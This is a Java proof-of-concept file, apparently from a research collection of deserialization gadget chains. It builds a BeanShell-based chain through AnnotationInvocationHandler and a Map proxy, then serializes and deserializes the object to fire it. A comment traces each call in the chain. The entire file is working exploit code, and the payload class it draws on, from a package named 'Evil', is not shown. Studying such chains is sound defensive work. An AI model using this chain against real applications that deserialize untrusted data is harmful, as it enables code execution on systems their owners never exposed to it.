package com.example.BeanShell;

import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import java.lang.annotation.Retention;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

public class POC_2 {

    /***
     * <sun.reflect.annotation.AnnotationInvocationHandler: void readObject(java.io.ObjectInputStream)>
     * <bsh.XThis$Handler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.XThis$Handler: java.lang.Object invokeImpl(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.Reflect: java.lang.Object invokeMethod(java.lang.reflect.Method,java.lang.Object,java.lang.Object[])>
     */

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = BeanShellCalc.getHandler("entrySet");
        Map map = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class<?>[]{Map.class}, handler);

        InvocationHandler h = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, map});

        SerializeUtil.deserialize(SerializeUtil.serialize(h));
    }
}